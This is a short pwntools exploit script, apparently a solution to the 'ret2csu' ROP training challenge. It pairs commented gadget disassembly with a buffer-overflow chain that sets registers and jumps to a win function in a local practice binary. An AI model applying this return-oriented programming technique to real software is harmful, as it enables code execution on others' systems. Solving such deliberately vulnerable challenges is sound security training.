# gadget 2
# 00400880 4c 89 fa        MOV        RDX,R15
# 00400883 4c 89 f6        MOV        RSI,R14
# 00400886 44 89 ef        MOV        EDI,R13D
# 00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy 
# 0040088d 48 83 c3 01     ADD        RBX,0x1
# 00400891 48 39 dd        CMP        RBP,RBX
# 00400894 75 ea           JNZ        LAB_00400880
# 00400896 48 83 c4 08     ADD        RSP,0x8

# gadget 1
# 0040089a 5b              POP        RBX
# 0040089b 5d              POP        RBP
# 0040089c 41 5c           POP        R12
# 0040089e 41 5d           POP        R13
# 004008a0 41 5e           POP        R14
# 004008a2 41 5f           POP        R15
# 004008a4 c3              RET


from pwn import *

e = ELF("ret2csu")
p = process(e.path)
# p = gdb.debug(e.path,"b pwnme\ncontinue\n")

junk = 'A' * 40

gadget1 = p64(0x0040089a)
gadget2 = p64(0x00400880)
ret2win = p64(0x4007b1)
magicword = p64(0xdeadcafebabebeef)
fini_pointer = p64(0x00600e48)

chain = junk
chain += gadget1
chain += p64(0x0) # pop rbx
chain += p64(0x1) # pop rbp
chain += fini_pointer # pop r12
chain += p64(0x0) # pop r13
chain += p64(0x0) # pop r14
chain += magicword # pop r15
chain += gadget2
chain += p64(0x0) # add rsp,0x8
chain += p64(0x0) # pop rbx
chain += p64(0x0) # pop rbx
chain += p64(0x0) # pop rbx
chain += p64(0x0) # pop rbx
chain += p64(0x0) # pop rbx
chain += p64(0x0) # pop rbx
chain += ret2win

p.sendline(chain)
print(p.readall())